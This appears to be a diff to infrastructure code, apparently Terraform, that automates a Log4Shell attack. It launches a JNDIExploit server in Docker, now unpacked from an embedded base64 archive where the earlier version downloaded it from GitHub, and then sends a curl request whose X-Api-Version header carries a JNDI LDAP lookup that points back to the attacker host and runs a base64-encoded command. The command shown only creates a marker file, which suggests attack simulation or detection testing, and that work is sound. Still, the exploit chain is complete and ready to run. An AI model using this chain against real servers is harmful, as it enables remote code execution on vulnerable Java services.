@@ -1,5 +1,5 @@
 locals {
-    jdniexploit_url="https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip"
+    # jdniexploit_url="https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip"
     image = "openjdk:11"
     name = "jdniexploit"
     attacker_http_port=var.attacker_http_port
@@ -7,12 +7,13 @@ locals {
     attacker_ip=var.attacker_ip
     target_ip=var.target_ip
     target_port=var.target_port
+    jndi_base64=file("${path.module}/resources/jdni.base64")
     base64_log4shell_payload=base64encode(<<-EOT
     touch /tmp/log4shell_pwned
     EOT
     )
     command_payload=<<-EOT
-    bash -c "wget ${local.jdniexploit_url} && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar -i 0.0.0.0 -p ${local.attacker_http_port}"
+    bash -c "echo '${local.jndi_base64.content}' | base64 -d > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
     EOT
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
@@ -31,6 +32,7 @@ locals {
     log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}')"
     docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
     docker ps -a >> $LOGFILE 2>&1
+    log "curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
     curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1 
     sleep 30
     log "done"
